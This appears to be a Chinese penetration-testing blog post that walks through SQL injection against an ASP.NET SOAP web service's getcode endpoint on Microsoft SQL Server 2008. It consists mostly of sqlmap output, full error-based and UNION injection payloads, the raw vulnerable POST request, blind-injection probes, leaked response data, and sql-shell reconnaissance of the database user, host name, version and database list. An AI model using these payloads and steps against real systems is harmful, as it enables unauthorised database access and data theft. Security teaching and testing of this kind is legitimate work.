<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">starting</span> <span class="nx">at</span> <span class="mi">11</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">20</span>

<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">confirming</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="nx">CRITICAL</span><span class="p">]</span> <span class="nx">connection</span> <span class="nx">timed</span> <span class="nx">out</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">target</span> <span class="nx">URL</span><span class="p">.</span> <span class="nx">sqlmap</span> <span class="nx">is</span> <span class="nx">going</span> <span class="nx">to</span> <span class="nx">retry</span> <span class="nx">the</span> <span class="nx">request</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span>
<span class="nx">web</span> <span class="nx">server</span> <span class="nx">operating</span> <span class="nx">system</span><span class="p">:</span> <span class="nx">Windows</span> <span class="mi">2008</span> <span class="nx">R2</span> <span class="nx">or</span> <span class="mi">7</span>
<span class="nx">web</span> <span class="nx">application</span> <span class="nx">technology</span><span class="p">:</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span> <span class="mf">4.0</span><span class="p">.</span><span class="mi">30319</span><span class="p">,</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="mf">7.5</span><span class="p">,</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span>
<span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="mi">2008</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">HTTP</span> <span class="nx">error</span> <span class="nx">codes</span> <span class="nx">detected</span> <span class="nx">during</span> <span class="nx">run</span><span class="p">:</span>
<span class="mi">500</span> <span class="p">(</span><span class="nx">Internal</span> <span class="nx">Server</span> <span class="nb">Error</span><span class="p">)</span> <span class="o">-</span> <span class="mi">19</span> <span class="nx">times</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetched</span> <span class="nx">data</span> <span class="nx">logged</span> <span class="nx">to</span> <span class="nx">text</span> <span class="nx">files</span> <span class="nx">under</span> <span class="dl">'</span><span class="s1">/root/.sqlmap/output/underattack-host</span><span class="dl">'</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">shutting</span> <span class="nx">down</span> <span class="nx">at</span> <span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">24</span>
</code></pre></div></div>
<p>注入payload单独发出来，如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span>
<span class="nx">Parameter</span><span class="p">:</span> <span class="nx">SOAP</span> <span class="err">#</span><span class="mi">1</span><span class="o">*</span> <span class="p">((</span><span class="nx">custom</span><span class="p">)</span> <span class="nx">POST</span><span class="p">)</span>
    <span class="nx">Type</span><span class="p">:</span> <span class="nx">error</span><span class="o">-</span><span class="nx">based</span>
    <span class="nx">Title</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span><span class="o">/</span><span class="nx">Sybase</span> <span class="nx">AND</span> <span class="nx">error</span><span class="o">-</span><span class="nx">based</span> <span class="o">-</span> <span class="nx">WHERE</span> <span class="nx">or</span> <span class="nx">HAVING</span> <span class="nx">clause</span> <span class="p">(</span><span class="nx">IN</span><span class="p">)</span>
    <span class="nx">Payload</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Envelope</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/envelope/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">soap</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/wsdl/soap/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsd</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsi</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema-instance</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">m0</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/encoding/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">urn</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Header</span><span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Body</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">getcode</span><span class="o">&gt;</span>
           <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">ins</span><span class="o">&gt;</span><span class="mi">1</span><span class="dl">'</span><span class="s1"> AND 1597 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113))) AND </span><span class="dl">'</span><span class="nx">DZUD</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="nx">DZUD</span><span class="o">&lt;</span><span class="sr">/urn:ins</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/urn:getcode</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="sr">/SOAP-ENV:Body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/SOAP-ENV:Envelope</span><span class="err">&gt;
</span>
    <span class="nx">Type</span><span class="p">:</span> <span class="nx">UNION</span> <span class="nx">query</span>
    <span class="nx">Title</span><span class="p">:</span> <span class="nx">Generic</span> <span class="nx">UNION</span> <span class="nx">query</span> <span class="p">(</span><span class="nx">NULL</span><span class="p">)</span> <span class="o">-</span> <span class="mi">7</span> <span class="nx">columns</span>
    <span class="nx">Payload</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Envelope</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/envelope/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">soap</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/wsdl/soap/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsd</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsi</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema-instance</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">m0</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/encoding/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">urn</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Header</span><span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Body</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">getcode</span><span class="o">&gt;</span>
           <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">ins</span><span class="o">&gt;</span><span class="mi">1</span><span class="dl">'</span><span class="s1"> UNION ALL SELECT CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(72)+CHAR(117)+CHAR(78)+CHAR(90)+CHAR(84)+CHAR(69)+CHAR(80)+CHAR(98)+CHAR(85)+CHAR(102)+CHAR(80)+CHAR(86)+CHAR(81)+CHAR(73)+CHAR(83)+CHAR(102)+CHAR(106)+CHAR(101)+CHAR(70)+CHAR(113)+CHAR(101)+CHAR(109)+CHAR(68)+CHAR(86)+CHAR(76)+CHAR(84)+CHAR(73)+CHAR(122)+CHAR(99)+CHAR(66)+CHAR(82)+CHAR(119)+CHAR(66)+CHAR(78)+CHAR(75)+CHAR(98)+CHAR(102)+CHAR(107)+CHAR(99)+CHAR(88)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- aKgd&lt;/urn:ins&gt;
        &lt;/urn:getcode&gt;
     &lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
---
</span></code></pre></div></div>
<p>我们可以偷懒一下，直接payload拿过来看看反包有什么不一样的地方~看到差别了吗。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Type: 报错注入（error-based）:
HTTP/1.1 500 Internal Server Error
Cache-Control: private
Content-Type: text/xml<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Length: 459

&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;&lt;soap:Envelope xmlns:soap<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span>xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns:xsd<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema"</span><span class="o">&gt;</span>&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server&lt;/faultcode&gt;&lt;faultstring&gt;Server was unable to process request.---&amp;gt<span class="p">;</span>在将 varchar 值 <span class="s1">'qpbzq1qzkxq'</span> 转换成数据类型&lt;/faultstring&gt;&lt;detail/&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
<span class="o">=======================================================================================</span>
<span class="o">=======================================================================================</span>
Type: 联合查询（UNION query），输出的信息比较多，限于篇幅，放上一些数据：

HTTP/1.1 200 OK
Cache-Control: private, max-age<span class="o">=</span>0
Content-Type: text/xml<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Content-Length: 20111

&lt;c_me_com&gt;10005&lt;/c_me_com&gt;&lt;c_me_no&gt;14&lt;/c_me_no&gt;&lt;c_me_bt&gt;10.11.201.233&lt;/c_me_bt&gt;&lt;c_me_command&gt;0&lt;/c_me_command&gt;&lt;c_me_lenght&gt;2&lt;/c_me_lenght&gt;&lt;c_me_start&gt;2000&lt;/c_me_start&gt;&lt;c_me_lastvalue&gt;0&lt;/c_me_lastvalue&gt;&lt;c_me_maxstep&gt;50&lt;/c_me_maxstep&gt;&lt;c_me_webcode&gt;com7.db001.db001t&lt;/c_me_webcode&gt;&lt;c_me_by19&gt;0.00&lt;/c_me_by19&gt;&lt;c_me_by20&gt;1&lt;/c_me_by20&gt;&lt;c_me_lastdate4&gt;2018-08-08T05:00:24.677+08:00&lt;/c_me_lastdate4&gt;&lt;c_me_lastvalue4&gt;313&lt;/c_me_lastvalue4&gt;&lt;c_me_lastdate3&gt;2018-08-08T06:03:06.137+08:00&lt;/c_me_lastdate3&gt;&lt;c_me_lastvalue3&gt;313&lt;/c_me_lastvalue3&gt;&lt;c_me_lastdate2&gt;2018-08-08T07:05:47.173+08:00&lt;/c_me_lastdate2&gt;&lt;c_me_lastvalue2&gt;313&lt;/c_me_lastvalue2&gt;&lt;c_me_lastdate1&gt;2018-08-08T08:08:28.543+08:00&lt;/c_me_lastdate1&gt;&lt;c_me_lastvalue1&gt;313&lt;/c_me_lastvalue1&gt;&lt;c_me_lastsuredate&gt;2018-08-08T11:11:05.27+08:00&lt;/c_me_lastsuredate&gt;&lt;c_me_lastsurevalue&gt;313&lt;/c_me_lastsurevalue&gt;&lt;/d2&gt;&lt;/ds&gt;&lt;/diffgr:diffgram&gt;&lt;/getcodeResult&gt;&lt;/getcodeResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
</code></pre></div></div>

<h2 id="常规查询">常规查询：</h2>
<p>当然在平常注入的过程中，不仅仅存在上述的注入，我们更多的是常见的盲注、联合查询或者是布尔盲注、时间盲注等等；我们这里举得例子同样存在，当然也是万能的awvs跑出来的：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Discovered</span> <span class="nx">by</span> <span class="nx">Blind</span> <span class="nx">SQL</span> <span class="nx">Injection</span>
<span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">POST</span> <span class="nx">input</span> <span class="nx">ins</span> <span class="nx">was</span> <span class="kd">set</span> <span class="nx">to</span> <span class="nx">eizSls</span>
<span class="nx">查看不同输入的符号对应的true</span><span class="err">、</span><span class="nx">flase值</span><span class="err">，</span><span class="nx">单数的</span><span class="o">%</span><span class="mi">27</span><span class="nx">输入进去我们可以看到是flase</span><span class="err">，</span><span class="nx">双数输入进去则为true</span><span class="err">：</span>
<span class="mi">462</span><span class="dl">'</span><span class="s1"> =&gt; ERROR
462</span><span class="dl">''</span><span class="s1"> =&gt; OK
GwHgee</span><span class="dl">'''</span> <span class="o">=&gt;</span> <span class="nx">ERROR</span>
<span class="mi">7</span><span class="nx">Ahb38</span><span class="dl">''''</span> <span class="o">=&gt;</span> <span class="nx">OK</span>
<span class="nx">CXBMlX</span><span class="dl">'''''</span><span class="s1"> =&gt; ERROR
xgBDwt</span><span class="dl">''''''</span><span class="s1"> =&gt; OK
eizSls</span><span class="dl">'''''''</span> <span class="o">=&gt;</span> <span class="nx">ERROR</span>
</code></pre></div></div>
<p>老方法，直接SQLMAP跑~</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span><span class="nx">WebService1</span><span class="p">.</span><span class="nx">asmx</span><span class="o">/</span><span class="nx">getcode</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="p">:</span> <span class="nx">XMLHttpRequest</span>
<span class="nx">Referer</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//vuln_ip:8081/WebService1.asmx?WSDL</span>
<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 17
Host: vuln_ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

ins=eizSls
</span></code></pre></div></div>
<p>跑出来也是一样的效果，当然是一样的注入点，都是getcode这个功能接口跑的数据：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="nx">parameter</span> <span class="dl">'</span><span class="s1">ins</span><span class="dl">'</span> <span class="nx">is</span> <span class="nx">vulnerable</span><span class="p">.</span> <span class="nx">Do</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">keep</span> <span class="nx">testing</span> <span class="nx">the</span> <span class="nx">others</span> <span class="p">(</span><span class="k">if</span> <span class="nx">any</span><span class="p">)?</span> <span class="p">[</span><span class="nx">y</span><span class="o">/</span><span class="nx">N</span><span class="p">]</span> <span class="nx">N</span>
<span class="nx">sqlmap</span> <span class="nx">identified</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">injection</span> <span class="nx">point</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="kd">with</span> <span class="nx">a</span> <span class="nx">total</span> <span class="k">of</span> <span class="mi">47</span> <span class="nx">HTTP</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">requests</span><span class="p">:</span>
<span class="o">---</span>
<span class="nx">Parameter</span><span class="p">:</span> <span class="nx">ins</span> <span class="p">(</span><span class="nx">POST</span><span class="p">)</span>
    <span class="nx">Type</span><span class="p">:</span> <span class="nx">error</span><span class="o">-</span><span class="nx">based</span>
    <span class="nx">Title</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span><span class="o">/</span><span class="nx">Sybase</span> <span class="nx">AND</span> <span class="nx">error</span><span class="o">-</span><span class="nx">based</span> <span class="o">-</span> <span class="nx">WHERE</span> <span class="nx">or</span> <span class="nx">HAVING</span> <span class="nx">clause</span> <span class="p">(</span><span class="nx">IN</span><span class="p">)</span>
    <span class="nx">Payload</span><span class="p">:</span> <span class="nx">ins</span><span class="o">=</span><span class="nx">eizSls</span><span class="dl">'</span><span class="s1"> AND 7541 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7541=7541) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113))) AND </span><span class="dl">'</span><span class="nx">EJIL</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="nx">EJIL</span>

    <span class="nx">Type</span><span class="p">:</span> <span class="nx">UNION</span> <span class="nx">query</span>
    <span class="nx">Title</span><span class="p">:</span> <span class="nx">Generic</span> <span class="nx">UNION</span> <span class="nx">query</span> <span class="p">(</span><span class="nx">NULL</span><span class="p">)</span> <span class="o">-</span> <span class="mi">7</span> <span class="nx">columns</span>
    <span class="nx">Payload</span><span class="p">:</span> <span class="nx">ins</span><span class="o">=</span><span class="nx">eizSls</span><span class="dl">'</span><span class="s1"> UNION ALL SELECT NULL,CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(67)+CHAR(85)+CHAR(78)+CHAR(111)+CHAR(108)+CHAR(112)+CHAR(72)+CHAR(81)+CHAR(82)+CHAR(108)+CHAR(89)+CHAR(68)+CHAR(67)+CHAR(99)+CHAR(105)+CHAR(109)+CHAR(105)+CHAR(86)+CHAR(121)+CHAR(99)+CHAR(122)+CHAR(90)+CHAR(109)+CHAR(112)+CHAR(98)+CHAR(88)+CHAR(89)+CHAR(68)+CHAR(90)+CHAR(101)+CHAR(71)+CHAR(100)+CHAR(118)+CHAR(81)+CHAR(114)+CHAR(83)+CHAR(101)+CHAR(90)+CHAR(117)+CHAR(100)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- HqcH
---
</span></code></pre></div></div>

<h1 id="信息搜集">信息搜集</h1>
<p>康康user，发现是dbo。<a href="https://blog.csdn.net/u010678947/article/details/48289849">SQL SERVER中[dbo]的解释：</a></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">web</span> <span class="nx">server</span> <span class="nx">operating</span> <span class="nx">system</span><span class="p">:</span> <span class="nx">Windows</span> <span class="mi">2008</span> <span class="nx">R2</span> <span class="nx">or</span> <span class="mi">7</span>
<span class="nx">web</span> <span class="nx">application</span> <span class="nx">technology</span><span class="p">:</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span> <span class="mf">4.0</span><span class="p">.</span><span class="mi">30319</span><span class="p">,</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="mf">7.5</span><span class="p">,</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span>
<span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="mi">2008</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">calling</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="nx">shell</span><span class="p">.</span> <span class="nx">To</span> <span class="nx">quit</span> <span class="nx">type</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span> <span class="nx">or</span> <span class="dl">'</span><span class="s1">q</span><span class="dl">'</span> <span class="nx">and</span> <span class="nx">press</span> <span class="nx">ENTER</span>
<span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">user</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span>
<span class="nx">user</span><span class="p">:</span>    <span class="dl">'</span><span class="s1">dbo</span><span class="dl">'</span>
</code></pre></div></div>
<p>看一下服务器是否站库分离：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="p">@@</span><span class="nd">servername</span><span class="p">;</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">select @@servername</span><span class="dl">'</span>
<span class="nx">select</span> <span class="p">@@</span><span class="nd">servername</span><span class="p">;:</span>    <span class="dl">'</span><span class="s1">WIN-VO157IKGT24</span><span class="dl">'</span>
<span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="nx">host_name</span><span class="p">();</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">select host_name()</span><span class="dl">'</span>
<span class="nx">select</span> <span class="nx">host_name</span><span class="p">();:</span>    <span class="dl">'</span><span class="s1">WIN-VO157IKGT24</span><span class="dl">'</span>
</code></pre></div></div>
<p>两个都是<code class="language-plaintext highlighter-rouge">WIN-VO157IKGT24</code>所以应该没有站库分离。看一下数据库版本号</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span><span class="o">&gt;</span> <span class="nx">Select</span> <span class="p">@@</span><span class="nd">version</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">SQL</span> <span class="nx">SELECT</span> <span class="nx">statement</span> <span class="nx">query</span> <span class="nx">output</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Select @@version</span><span class="dl">'</span>
<span class="nx">Select</span> <span class="p">@@</span><span class="nd">version</span><span class="p">:</span>    <span class="dl">'</span><span class="s1">Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) </span><span class="se">\n\t</span><span class="s1">Apr  2 2010 15:48:46 </span><span class="se">\n\t</span><span class="s1">Copyright (c) Microsoft Corporation</span><span class="se">\n\t</span><span class="s1">Standard Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)</span><span class="se">\n</span><span class="dl">'</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="err">#</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">tool</span><span class="o">/</span><span class="nx">sqlmap</span><span class="o">-</span><span class="nx">data</span><span class="o">/</span><span class="nx">wsdl</span><span class="o">-</span><span class="nx">inject</span><span class="err">#</span> <span class="nx">sqlmap</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">net</span><span class="o">-</span><span class="nx">test1</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">batch</span> <span class="o">--</span><span class="nx">dbs</span>
<span class="o">---</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span>
<span class="nx">web</span> <span class="nx">server</span> <span class="nx">operating</span> <span class="nx">system</span><span class="p">:</span> <span class="nx">Windows</span> <span class="mi">2008</span> <span class="nx">R2</span> <span class="nx">or</span> <span class="mi">7</span>
<span class="nx">web</span> <span class="nx">application</span> <span class="nx">technology</span><span class="p">:</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span> <span class="mf">4.0</span><span class="p">.</span><span class="mi">30319</span><span class="p">,</span> <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="mf">7.5</span><span class="p">,</span> <span class="nx">ASP</span><span class="p">.</span><span class="nx">NET</span>
<span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="p">:</span> <span class="nx">Microsoft</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="mi">2008</span>
<span class="p">[</span><span class="mi">11</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">database</span> <span class="nx">names</span>
<span class="nx">available</span> <span class="nx">databases</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">master</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">model</span>
